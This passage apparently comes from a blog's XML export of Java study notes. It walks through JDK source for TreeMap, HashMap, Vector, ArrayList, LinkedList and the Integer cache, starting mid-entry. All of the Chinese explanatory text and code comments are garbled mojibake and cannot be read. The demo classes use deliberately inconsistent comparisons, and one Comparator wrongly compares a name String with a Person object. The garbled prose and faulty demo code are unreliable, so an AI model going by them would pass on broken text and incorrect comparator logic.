Comparator&lt;? super K&gt; cpr = comparator;//Ëøô‰∏™ÂÄºÂèØ‰ª•Âú®TreeMapÊûÑÈÄ†ÂáΩÊï∞Âá∫ÂàùÂßãÂåñ       if (cpr != null) {//Êé•‰∏ãÊù•Â∞±ÊòØÈÄöËøáÂà§Êñ≠ÊòØÂê¶Âú®TreeMapÂàùÂßãÂåñÊó∂ÂàùÂßãÂåñ‰∫ÜComparatorÔºåÂ¶ÇÊûúÊòØÔºåÊù•leftÂíårightÔºå‰ΩÜ=0Êó∂ÔºåÁõ¥Êé•ÊõøÊç¢Êéâ           do {               parent = t;               cmp = cpr.compare(key, t.key);               if (cmp &lt; 0)                   t = t.left;               else if (cmp &gt; 0)                   t = t.right;               else                   return t.setValue(value);           } while (t != null);       }       else {//Â¶ÇÊûúÊ≤°ÊúâÂàùÂßãÂåñComparatorÔºåÂ∞±‰ªéÊØîËæÉÁöÑobject key‰∏≠ÂèñÂá∫ComparableÔºå‰πüÂ∞±ÊòØkey‰∏≠impements ComparableÊé•Âè£           if (key == null)               throw new NullPointerException();           @SuppressWarnings(&quot;unchecked&quot;)               Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key;           do {               parent = t;               cmp = k.compareTo(t.key);               if (cmp &lt; 0)                   t = t.left;               else if (cmp &gt; 0)                   t = t.right;               else                   return t.setValue(value);           } while (t != null);       }       Entry&lt;K,V&gt; e = new Entry&lt;&gt;(key, value, parent);//ÊâæÂà∞ÂêéÔºåÊñ∞Âª∫ËäÇÁÇπÔºåÊ†πÊçÆcmpÁªìÊûúÊîæÂú®Â∑¶ËæπÂè≥Ëæπ       if (cmp &lt; 0)           parent.left = e;       else           parent.right = e;       fixAfterInsertion(e);       size++;       modCount++;       return null;   }</code></pre><p>get</p><pre><code>public V get(Object key) {        Entry&lt;K,V&gt; p = getEntry(key);        return (p==null ? null : p.value);    }final Entry&lt;K,V&gt; getEntry(Object key) {        // Offload comparator-based version for sake of performance        if (comparator != null)//ËøôËæπÊòØtreeMapÂÆûÁé∞‰∫ÜComparatorÊé•Âè£            return getEntryUsingComparator(key);        if (key == null)            throw new NullPointerException();        @SuppressWarnings(&quot;unchecked&quot;)            Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key;        Entry&lt;K,V&gt; p = root;        while (p != null) {//ËøôËæπÊòØÔºåÊ≤°ÂÆûÁé∞Ôºå‰ΩÜÊòØkeyËøô‰∏™object‰∏≠ÂÆûÁé∞‰∫ÜComparableÊé•Âè£            int cmp = k.compareTo(p.key);            if (cmp &lt; 0)                p = p.left;            else if (cmp &gt; 0)                p = p.right;            else                return p;        }        return null;    }final Entry&lt;K,V&gt; getEntryUsingComparator(Object key) {\\ËøôËæπÊòØtreeMapÂÆûÁé∞‰∫ÜComparatorÊé•Âè£        @SuppressWarnings(&quot;unchecked&quot;)            K k = (K) key;        Comparator&lt;? super K&gt; cpr = comparator;        if (cpr != null) {            Entry&lt;K,V&gt; p = root;            while (p != null) {                int cmp = cpr.compare(k, p.key);                if (cmp &lt; 0)                    p = p.left;                else if (cmp &gt; 0)                    p = p.right;                else                    return p;            }        }        return null;    }    \\ÂÖ∑‰ΩìÊü•ËØ¢Â∞±Ê†ëÈÅçÂéÜ‰∏ÄÊ†∑ÔºåÁî®Â≠òÊîæÁöÑËßÑÂàôÂÜçÊù•ÂØªÊâæ</code></pre><hr><p><strong>ÁªìËÆ∫</strong><br>È¶ñÂÖàÔºåÂ¶ÇÊûúÊÉ≥Ë¶ÅÂ≠òÂÖ•ËøõTreeMap‰∏≠ÔºåÈ¶ñÂÖàÊúâÂâçÊèêÔºå <strong>TreeMapÂàùÂßãÂåñÁöÑÊó∂ÂÄôË¶ÅÂÆûÁé∞ComparatorÊé•Âè£ÔºåÂπ∂ÈáçÂÜôcompareÊñπÊ≥ï</strong> <em>*</em><br>ÊàñËÄÖÊòØ***TreeMapÂ≠òÂÖ•ÁöÑkeyËøô‰∏™objectÂÆûÁé∞‰∫ÜComparableÊé•Âè£ÔºåÂπ∂ÈáçÂÜô‰∫ÜcompareToÊñπÊ≥ï</p><p>‰∏ãÈù¢ÂÆûÁé∞‰∏§‰∏™ÊñπÊ≥ï<br>1.object key‰∏≠ÂÆûÁé∞ComparableÊé•Âè£</p><pre><code>public class Person implements Comparable&lt;Person&gt; {    private String name;    public Person(String name) {        this.name = name;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    @Override    public String toString() {        return &quot;Person{&quot; +                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +                &apos;}&apos;;    }    @Override    public int compareTo(Person o) {        if(this.name.equals(o.getName())){//Ëøô‰∏™Âú∞ÊñπÔºåÊàëÂ∞ÜÁõ∏ÂêåÁöÑ‰ø°ÊÅØÔºåËøîÂõû1Ôºå‰∏çÂêåËøîÂõû-1ÔºåÂΩìÁÑ∂Ëøô‰∏çÁ¨¶ÂêàÈÄªËæëÔºåÊàëÂè™ÊòØÂ∞ùËØï‰∏Ä‰∏ã            return 1;        }else{            return -1;        }    }}import java.util.*;public class TreeMapDemo {    public static void main(String[] args){        TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;();        treeMap.put(new Person(&quot;husky&quot;),1);        treeMap.put(new Person(&quot;husky&quot;),2);        treeMap.put(new Person(&quot;husky&quot;),3);          Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet();          for(Map.Entry&lt;Person,Integer&gt; e:entry){              System.out.println(e.getKey().getName()+&quot;  &quot;+e.getValue());          }    }}//ËæìÂá∫ÁªìÊûú/**husky  1husky  2husky  3*/</code></pre><p>2.TreeMapÂàùÂßãÂåñÊòØÔºåÂàùÂßãÂåñ‰∫ÜComparatorÊé•Âè£</p><pre><code>public class Person  {    private String name;    public Person(String name) {        this.name = name;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    @Override    public String toString() {        return &quot;Person{&quot; +                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +                &apos;}&apos;;    }}import java.util.*;public class TreeMapDemo {    public static void main(String[] args){        TreeMap&lt;Person,Integer&gt; treeMap = new TreeMap&lt;Person, Integer&gt;(new Comparator&lt;Person&gt;() {            @Override            public int compare(Person o1, Person o2) {                if (o1.getName().equals(o2)){                    return 1;                }else {                    return -1;                }            }        });        treeMap.put(new Person(&quot;husky&quot;),1);        treeMap.put(new Person(&quot;husky&quot;),2);        treeMap.put(new Person(&quot;husky&quot;),3);          Set&lt;Map.Entry&lt;Person,Integer&gt;&gt; entry = treeMap.entrySet();          for(Map.Entry&lt;Person,Integer&gt; e:entry){              System.out.println(e.getKey().getName()+&quot;  &quot;+e.getValue());          }    }}/**husky  3husky  2husky  1*/</code></pre><p>ÂèÇËÄÉÂçöÂÆ¢ <a href="https://blog.csdn.net/qq_32166627/article/details/72773293" target="_blank" rel="noopener"> javaÈõÜÂêàÔºà6ÔºâÔºöTreeMapÊ∫êÁ†ÅÂàÜÊûêÔºàjdk1.8Ôºâ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> Èù¢ËØï </tag>
            
            <tag> treemap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMapÂ≠òÂÖ•Êï∞ÊçÆÊó∂Ê∫êÁ†ÅÈòÖËØª</title>
      <link href="/2018/07/18/HashMap%E5%AD%98%E5%85%A5%E6%95%B0%E6%8D%AE%E6%97%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
      <url>/2018/07/18/HashMap%E5%AD%98%E5%85%A5%E6%95%B0%E6%8D%AE%E6%97%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p><em>È¶ñÂÖàjavaÁâàÊú¨1.8</em><br>È¶ñÂÖàÁ°ÆÂÆöÁöÑÊòØÔºåHashMapÁöÑÂ≠òÂÇ®ÁªìÊûÑ<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373877.72377061819.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>Á∫¶ÂÆöÂú®ÂâçÈù¢ÁöÑÊòØÊ°∂<br>Âú®Ê°∂ÂêéÈù¢ÁöÑÈìæË°®ÊòØbin<br>Ê∫êÁ†Å</p><pre><code>//hashmap‰∏≠ÁöÑputÊñπÊ≥ïpublic V put(K key, V value) {        return putVal(hash(key), key, value, false, true);    }static final int hash(Object key) {        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);        //Ë∞ÉÁî®ÁöÑÊòØobjectÁöÑhashcodeÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶Å‰øÆÊîπÊó∂Ë¶ÅÂ∞ÜkeyÁöÑhashcode‰øÆÊîπÔºå‰ª•ÂèäÂú®‰∏ãÈù¢putVal‰∏≠‰ºöË∞ÉÁî®Âà∞equalsÊñπÊ≥ï„ÄÇ        //&gt;&gt;&gt; ,&gt;&gt; ,&lt;&lt; ÊòØjava‰∏≠‰ªÖÊúâÁöÑÁßª‰ΩçËøêÁÆóÁ¨¶.&gt;&gt;&gt;ÊòØÊó†Á¨¶Âè∑Âè≥Áßª    } final V putVal(int hash, K key, V value, boolean onlyIfAbsent,                   boolean evict) {        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;        if ((tab = table) == null || (n = tab.length) == 0)            n = (tab = resize()).length;            //Ê≠§Â§ÑÊòØ||ÔºåÊâÄ‰ª•ÂàÜ‰∏∫‰∏§ÁßçÊÉÖÂÜµÔºåÁ¨¨‰∏ÄÁßçtable‰∏∫Á©∫ÔºåÂàùÂßãÂåñtableÔºåÁ¨¨‰∫åÁßçÂ∞Ütab.lengthËµãÁªôn        if ((p = tab[i = (n - 1) &amp; hash]) == null)            tab[i] = newNode(hash, key, value, null);//Âà§Êñ≠ÈÄöËøáhashËøêÁÆóÂêéÁöÑtab‰∏äÊòØÂê¶ÊúâÂÄºÔºåÂ¶ÇÊûúÊ≤°ÊúâÔºåÂ∞±Êñ∞Âª∫        else {            Node&lt;K,V&gt; e; K k;            if (p.hash == hash &amp;&amp;                ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))                e = p;//Â¶ÇÊûú‰∏§‰∏™keyÁõ∏ÂêåÔºåÂ∞ÜpÁªôËµãÁªôeÔºå‰ºöÂú®‰∏ãÊñπÂà§Êñ≠eÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏ç‰∏∫Á©∫ÔºåÂ∞ÜÂéüÊù•ÁöÑoldVal = newValÔºõ            else if (p instanceof TreeNode)            //Ê≠§Â§ÑÂà§Êñ≠ÊòØÂê¶ÊòØÁ∫¢ÈªëÊ†ë                e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);//            else {//ÂΩìÂâçËøòÊòØ‰∏∫ÈìæË°®                for (int binCount = 0; ; ++binCount) {                    if ((e = p.next) == null) {                        p.next = newNode(hash, key, value, null);//‰ªéÂΩìÂâçbin‰∏≠ÈÅçÂéÜÔºåÈÅçÂéÜÂà∞ÊúÄÂêéÔºåÂú®Êú´Â∞ænewNodeÔºåÊèíÂÖ•ÂÄº                        if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st                        //Ê≠§Â§ÑÂ∑≤ÁªèÂ§ß‰∫éTREEIFY_THRESHOLDÔºåÊâÄÊúâÈìæË°®ÂèòÊàêÁ∫¢ÈªëÊ†ë                            treeifyBin(tab, hash);                        break;                    }                    if (e.hash == hash &amp;&amp;                        ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))                        break;                    p = e;                }            }            if (e != null) { // existing mapping for key            //keyÂÄºÂ≠òÂú®ÔºåÂ∞±ÊõøÊç¢                V oldValue = e.value;                if (!onlyIfAbsent || oldValue == null)                    e.value = value;                afterNodeAccess(e);                return oldValue;            }        }        ++modCount;        if (++size &gt; threshold)//Êâ©ÂÆπ            resize();        afterNodeInsertion(evict);        return null;    }</code></pre><p>ËøòÊúâÂÖ∑‰ΩìÊâ©ÂÆπÂèòÊç¢ËøáÁ®ãÔºåÂèØ‰ª•ÂèÇËÄÉ‰ª•‰∏ãÂçöÂÆ¢<br><a href="https://blog.csdn.net/fan2012huan/article/details/51088211" target="_blank" rel="noopener"> HashMapÁöÑÊâ©ÂÆπÂèäÊ†ëÂåñËøáÁ®ã</a><br>ÂÖ∑‰ΩìÂèÇËÄÉ‰∫Ü‰ª•‰∏ãÂá†ÁØáÂçöÂÆ¢Ôºö <a href="https://blog.csdn.net/lianhuazy167/article/details/66967698" target="_blank" rel="noopener"> https://blog.csdn.net/lianhuazy167/article/details/66967698</a><br><a href="https://blog.csdn.net/fan2012huan/article/details/51088211" target="_blank" rel="noopener"> https://blog.csdn.net/fan2012huan/article/details/51088211</a><br><a href="https://blog.csdn.net/u013412772/article/details/80748604" target="_blank" rel="noopener"> https://blog.csdn.net/u013412772/article/details/80748604</a><br>Áúã‰∫Ü‰∏Ä‰∏ãÂçàÁöÑÊ∫êÁ†ÅÔºåÁªà‰∫éÁÆóÊúâ‰∏™Â§ßËá¥‰∫ÜËß£‰∫Ü</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> hashmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂØπÊØîVector„ÄÅArrayList„ÄÅLinkedListÊúâ‰ΩïÂå∫Âà´</title>
      <link href="/2018/07/17/%E5%AF%B9%E6%AF%94Vector%E3%80%81ArrayList%E3%80%81LinkedList%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB/"/>
      <url>/2018/07/17/%E5%AF%B9%E6%AF%94Vector%E3%80%81ArrayList%E3%80%81LinkedList%E6%9C%89%E4%BD%95%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>Ëøô‰∏âËÄÖÈÉΩÊòØÂÆûÁé∞ÈõÜÂêàÊ°ÜÊû∂ÁöÑListÔºå‰πüÂ∞±ÊòØÊâÄË∞ìÁöÑÊúâÂ∫èÈõÜÂêàÔºåÂõ†Ê≠§ÂÖ∑‰ΩìÂäüËÉΩÈÉΩÂÆûÁé∞‰∫ÜÊåâÁÖß‰ΩçÁΩÆËøõË°åÂÆö‰ΩçÔºå‰øÆÊîπÔºåÊ∑ªÂä†ÊàñËÄÖÂà†Èô§ÔºåÈÉΩÊèê‰æõ‰∫ÜËø≠‰ª£Âô®‰ª•ÈÅçÂéÜÂÖ∂ÂÜÖÂÆπÔºå‰ΩÜÂõ†‰∏∫ÂÖ∑‰ΩìËÆæËÆ°‰∏çÂêåÔºåÂú®Ë°å‰∏∫ÔºåÊÄßËÉΩÔºåÁ∫øÁ®ãÂÆâÂÖ®Á≠âÊñπÈù¢ÔºåË°®Áé∞ÂèàÊúâÂæàÂ§ß‰∏çÂêå„ÄÇ<br>VectorÊòØjavaÊó©ÊúüÊèê‰æõÁöÑÁ∫øÁ®ãÂÆâÂÖ®ÁöÑÂä®ÊÄÅÊï∞ÁªÑÔºå‰ΩÜÊï∞ÊçÆÊª°Êó∂ÔºåËá™Âä®Êâ©ÂÆπÔºå‰ºöÂàõÂª∫Êñ∞ÁöÑÊï∞ÁªÑÔºåÂπ∂Êã∑Ë¥ùÂéüÊúâÁöÑÊï∞ÁªÑ„ÄÇ<br>ArrayListÊòØÂ∫îÁî®Êõ¥ÂπøÊ≥õÁöÑÂä®ÊÄÅÊï∞ÁªÑÔºåÂÆÉÊú¨Ë∫´ÊòØÁ∫øÁ®ã‰∏çÂÆâÂÖ®ÁöÑÔºåÊâÄ‰ª•ÊÄßËÉΩ‰ºöÂ•ΩÂæàÂ§öÔºåÊâ©ÂÆπÊó∂ÔºåÂíåvector‰∏ç‰∏ÄÊ†∑ÔºåvectorÊòØÊâ©Â§ß‰∏ÄÂÄçÔºåËÄåArrayListÊòØÂ¢ûÂä†50%„ÄÇ<br>LinkedListÊòØjavaÊèê‰æõÁöÑÂèåÂêëÈìæË°®ÔºåÂÆÉ‰∏çÊòØÁ∫øÁ®ãÂÆâÂÖ®ÁöÑÔºå‰πüÈúÄË¶ÅÂêë‰∏äÈù¢‰∏§ÁßçË∞ÉÊï¥ÂÆπÈáè„ÄÇ</p><hr><p><strong>Áü•ËØÜÊâ©Â±ï</strong></p><p>1.VectorÂíåArrayList‰Ωú‰∏∫Âä®ÊÄÅÊï∞ÁªÑÔºåÂÆÉÂÜÖÈÉ®ÊòØÊï∞ÁªÑÂÆûÁé∞ÁöÑÔºåÂçÅÂàÜ‰æø‰∫éÈöèÊú∫ËÆøÈóÆÔºåÈô§‰∫ÜÂ∞æÈÉ®ÊèíÂÖ•Êï∞ÊçÆÔºåÊàñËÄÖÂà†Èô§Êï∞ÊçÆÊó∂ÔºåÊÄßËÉΩÊòØÁõ∏ÂØπËæÉÂ∑ÆÁöÑ„ÄÇÊØîÂ¶ÇÊàë‰ª¨Âú®‰∏≠ÈÉ®ÊèíÂÖ•Êï∞ÊçÆÔºåÈúÄË¶ÅÂêéÁßªÊâÄÊúâÊï∞ÊçÆ„ÄÇ<br>2.LinkedListËøõË°åÁªìÁÇπÊèíÂÖ•Âà†Èô§ÂæàÈ´òÊïàÔºå‰ΩÜÊòØÈöèÊú∫ËÆøÈóÆÊØîÂä®ÊÄÅÊï∞ÊçÆÊÖ¢ÂæàÂ§ö„ÄÇ</p><hr><p><strong>Ê∫êÁ†Å</strong></p><p>Vector</p><pre><code>//Vector protected Object[] elementData; //Âä®ÊÄÅÊï∞ÁªÑ public Vector(int initialCapacity) {        this(initialCapacity, 0);    }    /**     * Constructs an empty vector so that its internal data array     * has size {@code 10} and its standard capacity increment is     * zero.     */    public Vector() {        this(10);    }    //ÂàùÂßãÂåñÂä®ÊÄÅÊï∞ÁªÑÈªòËÆ§Â§ßÂ∞è‰∏∫10        public synchronized boolean add(E e) {        modCount++;        ensureCapacityHelper(elementCount + 1);        elementData[elementCount++] = e;        return true;    }     private void ensureCapacityHelper(int minCapacity) {        // overflow-conscious code        if (minCapacity - elementData.length &gt; 0)            grow(minCapacity);    }    private void grow(int minCapacity) {        // overflow-conscious code        int oldCapacity = elementData.length;        int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ?                                         capacityIncrement : oldCapacity);        if (newCapacity - minCapacity &lt; 0)            newCapacity = minCapacity;        if (newCapacity - MAX_ARRAY_SIZE &gt; 0)            newCapacity = hugeCapacity(minCapacity);        elementData = Arrays.copyOf(elementData, newCapacity);    }    //ËøôËæπÂèØ‰ª•ÁúãÂá∫ÔºåÊâ©ÂÆπÊó∂ÔºåÊòØÊâ©Â§ß‰∏ÄÂÄç„ÄÇ int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ?capacityIncrement : oldCapacity);public synchronized int indexOf(Object o, int index) {        if (o == null) {            for (int i = index ; i &lt; elementCount ; i++)                if (elementData[i]==null)                    return i;        } else {            for (int i = index ; i &lt; elementCount ; i++)                if (o.equals(elementData[i]))                    return i;        }        return -1;    }    //ÂÆö‰ΩçÊó∂‰ºöÂØπobjectËøõË°åÂà§Êñ≠ÔºåÂ¶ÇÊûúÊòØnullÔºåÁî®==Âà§Êñ≠ÔºåÂ¶ÇÊûú‰∏çÊòØnullÔºåÁî®equals    public synchronized Iterator&lt;E&gt; iterator() {        return new Itr();    }    /**     * An optimized version of AbstractList.Itr     */    private class Itr implements Iterator&lt;E&gt; {        int cursor;       // index of next element to return        int lastRet = -1; // index of last element returned; -1 if no such        int expectedModCount = modCount;        public boolean hasNext() {            // Racy but within spec, since modifications are checked            // within or after synchronization in next/previous            return cursor != elementCount;        }        public E next() {            synchronized (Vector.this) {                checkForComodification();                int i = cursor;                if (i &gt;= elementCount)                    throw new NoSuchElementException();                cursor = i + 1;                return elementData(lastRet = i);            }        }    }//ÂØπvectorËøõË°åÈÅçÂéÜ‰πüÂ∞±Êñπ‰æø‰∫ÜIterator&lt;String&gt; it = vector.iterator();        while(it.hasNext()){            System.out.println(it.next());        }</code></pre><p>ArrayList</p><pre><code>    transient Object[] elementData;    //Âä®ÊÄÅÊï∞ÁªÑprivate void grow(int minCapacity) {        // overflow-conscious code        int oldCapacity = elementData.length;        int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);        if (newCapacity - minCapacity &lt; 0)            newCapacity = minCapacity;        if (newCapacity - MAX_ARRAY_SIZE &gt; 0)            newCapacity = hugeCapacity(minCapacity);        // minCapacity is usually close to size, so this is a win:        elementData = Arrays.copyOf(elementData, newCapacity);    }    //Êâ©ÂÆπÊó∂ÔºåÊòØ&gt;&gt;1,‰πüÂ∞±ÊòØ/2„ÄÇÊâÄ‰ª•ÔºåÂ∞±ÊòØÊâ©ÂÆπ50%„ÄÇ       public boolean add(E e) {        ensureCapacityInternal(size + 1);  // Increments modCount!!        elementData[size++] = e;        return true;    }    //Á∫øÁ®ã‰∏çÂÆâÂÖ®</code></pre><p>LinkedList</p><pre><code>transient int size = 0;  /**   * Pointer to first node.   * Invariant: (first == null &amp;&amp; last == null) ||   *            (first.prev == null &amp;&amp; first.item != null)   */  transient Node&lt;E&gt; first;  /**   * Pointer to last node.   * Invariant: (first == null &amp;&amp; last == null) ||   *            (last.next == null &amp;&amp; last.item != null)   */  transient Node&lt;E&gt; last;  //‰∏§‰∏™ÈìæË°®   public boolean add(E e) {      linkLast(e);      return true;  }   void linkLast(E e) {      final Node&lt;E&gt; l = last;      final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null);      last = newNode;      if (l == null)          first = newNode;      else          l.next = newNode;      size++;      modCount++;  }  //ÂΩìÁÑ∂ËøòÊúâpopÔºåpushÊñπÊ≥ïÔºålinkedList‰∏ç‰ªÖ‰ªÖÁªßÊâø‰∫ÜAbstractListËÄå‰∏îÁªßÊâø‰∫ÜDequeÔºåÂèØ‰ª•ÂÆûÁé∞ÂèåÂêëÈòüÂàó‰ΩøÁî®</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> Èù¢ËØïÈ¢ò </tag>
            
            <tag> Èù¢ËØï </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>int Âíå Integer Êúâ‰ªÄ‰πàÂå∫Âà´ÔºüË∞àË∞à IntegerÁºìÂ≠òÂÄºÁöÑËåÉÂõ¥</title>
      <link href="/2018/07/17/int%20%E5%92%8C%20Integer%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F%E8%B0%88%E8%B0%88%20Integer%E7%BC%93%E5%AD%98%E5%80%BC%E7%9A%84%E8%8C%83%E5%9B%B4/"/>
      <url>/2018/07/17/int%20%E5%92%8C%20Integer%20%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F%E8%B0%88%E8%B0%88%20Integer%E7%BC%93%E5%AD%98%E5%80%BC%E7%9A%84%E8%8C%83%E5%9B%B4/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖàintÊòØÂéüÂßãÊï∞ÊçÆÁ±ªÂûãÔºåÂú®java‰∏≠Êúâ8‰∏™ËøôÊ†∑ÁöÑÂéüÂßãÊï∞ÊçÆÁ±ªÂûãÔºåÂàÜÂà´‰∏∫ÔºöintÔºåshortÔºåbooleanÔºåbyteÔºåcharÔºåfloatÔºådoubleÔºålong„ÄÇjavaÂΩì‰∏≠‰∏ÄÂàáÁöÜÊòØÂØπË±°Ôºå‰ΩÜÂü∫Êú¨Êï∞ÊçÆÁ±ªÂûãÈô§Â§ñ„ÄÇ<br>IntegerÊòØintÁöÑÂåÖË£ÖÔºåÂÆÉÊúâ‰∏Ä‰∏™intÁ±ªÂûãÁöÑÂ≠óÊÆµÂ≠òÂÇ®Êï∞ÊçÆÔºåÂπ∂‰∏îÊèê‰æõ‰∫ÜÂü∫Êú¨Êìç‰ΩúÔºåÊØîÂ¶ÇÊï∞Â≠¶ËøêÁÆóÔºå‰ΩçËøêÁÆóÁ≠â„ÄÇÂú®java5‰∏≠ÂºïÂÖ•‰∫ÜËá™Âä®Ë£ÖÁÆ±ÔºåËá™Âä®ÊãÜÁÆ±ÁöÑÂäüËÉΩÔºåÊûÅÂ§ßÁÆÄÂåñ‰∫ÜÁõ∏ÂÖ≥ÁºñÁ®ã„ÄÇ<br>IntegerÁºìÂ≠òÂÄºÔºåËøô‰∏™ÈóÆÈ¢òÔºåÂú®ÂπøÂÆûË∑µ‰∏≠ÔºåÂ§ßÈáèÁöÑÊï∞ÊçÆÊìç‰Ωú‰∏≠ÔºåÈÉΩÊòØÈõÜ‰∏≠Âú®ÊúâÈôêÔºåËæÉÂ∞èÁöÑÊï∞ÊçÆËåÉÂõ¥ÂÜÖÔºåÂú®java5‰∏≠Êñ∞Â¢û‰∫ÜÈùôÊÄÅÂ∑•ÂéÇÊñπÊ≥ïvalueOfÔºàÔºâÔºåÂú®Ë∞ÉÁî®ÂÆÉÁöÑÊó∂ÂÄôÔºå‰ºöËøêÁî®Âà∞ÁºìÂ≠òÊú∫Âà∂ÔºåÂ∏¶Êù•ÊòéÊòæÁöÑÊÄßËÉΩÊèêÂçá„ÄÇÊåâÁÖßjavadocÔºåËøô‰∏™ÂÄº<br><strong>ÈªòËÆ§</strong> ÁºìÂ≠òËåÉÂõ¥ÊòØ-128~127.</p><p><strong>Áü•ËØÜÁÇπÊâ©Â±ï</strong><br>1.Ëá™Âä®Ë£ÖÁÆ±ÔºåÂíåËá™Âä®ÊãÜÁÆ±<br>Ëá™Âä®Ë£ÖÁÆ±ÂÖ∂ÂÆûÊòØ‰∏ÄÁßçËØ≠Ê≥ïÁ≥ñÔºåÂèØ‰ª•ÁÆÄÂçïÁêÜËß£‰∏∫javaÂπ≥Âè∞‰∏∫Êàë‰ª¨Ëá™Âä®ËøõË°å‰∏Ä‰∫õËΩ¨ÂåñÔºå‰øùËØÅ‰∏çÂêåÂÜôÊ≥ïÂú®ËøêË°åÊó∂Á≠â‰ª∑Ôºå‰ªñ‰ª¨ÂèëÁîüÂú® <strong>ÁºñËØëÈò∂ÊÆµ</strong><br>Ôºå‰πüÂ∞±ÊòØÁîüÊàêÁöÑÂ≠óËäÇÁ†ÅÊòØÁõ∏ÂêåÁöÑ„ÄÇ</p><pre><code>Integer integer = 1;int unboxing = integer ++;</code></pre><p>ÂèçÁºñËØëËæìÂá∫</p><pre><code>1: invokestatic #2java/lang/Integer.valueOf:(I)Ljava/lang/Integer;8: invokevirtual #3java/lang/Integer.intValue:()I</code></pre><p>ËøôÁßçÁºìÂ≠òÊú∫Âà∂‰∏çÊòØÂè™ÊúâIntegerÂÆûÁé∞‰∫ÜÔºåÂêåÊ†∑Â≠òÂú®‰∫éÂÖ∂‰ªñÁöÑÂåÖË£ÖÁ±ª‰∏≠„ÄÇÂ¶ÇBoolean Boolean.TRUE,Boolean.FalseÔºåShort<br>-128~127ÔºåByte ÂÖ®ÈÉ®ÁºìÂ≠òÔºåCharacter ÁºìÂ≠òËåÉÂõ¥ ‚Äò\u0000‚Äô Âà∞ ‚Äò\u007F‚Äô„ÄÇ<br>ÂéüÂàô‰∏äÂª∫ËÆÆÈÅøÂÖçËá™Âä®Ë£ÖÁÆ±ÔºåÊãÜÁÆ±Ë°å‰∏∫ÔºåÂ∞§ÂÖ∂ÊòØÂú®ÊÄßËÉΩÊïèÊÑü„ÄÇ</p><hr><pre><code>   public static Integer valueOf(String s, int radix) throws NumberFormatException {        return Integer.valueOf(parseInt(s,radix));    }    public static Integer valueOf(String s) throws NumberFormatException {        return Integer.valueOf(parseInt(s, 10));    }    //‰ª•‰∏äÊòØvalueof  public static Integer valueOf(int i) {        if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)            return IntegerCache.cache[i + (-IntegerCache.low)];        return new Integer(i);    }private static class IntegerCache {        static final int low = -128;        static final int high;        static final Integer cache[];        static {            // high value may be configured by property            int h = 127;            String integerCacheHighPropValue =                sun.misc.VM.getSavedProperty(&quot;java.lang.Integer.IntegerCache.high&quot;);            if (integerCacheHighPropValue != null) {                try {                    int i = parseInt(integerCacheHighPropValue);                    i = Math.max(i, 127);                    // Maximum array size is Integer.MAX_VALUE                    h = Math.min(i, Integer.MAX_VALUE - (-low) -1);                } catch( NumberFormatException nfe) {                    // If the property cannot be parsed into an int, ignore it.                }            }            high = h;            cache = new Integer[(high - low) + 1];            int j = low;            for(int k = 0; k &lt; cache.length; k++)                cache[k] = new Integer(j++);            // range [-128, 127] must be interned (JLS7 5.1.7)            assert IntegerCache.high &gt;= 127;        }        private IntegerCache() {}    }</code></pre><p>‰ªé‰∏äÈù¢Êàë‰ª¨ÂèØ‰ª•ÁúãÂá∫ÔºåÂú®ÂàõÂª∫IntegerÂØπË±°Êó∂Ôºå‰ºöË∞ÉÁî®public static Integer valueOf(int 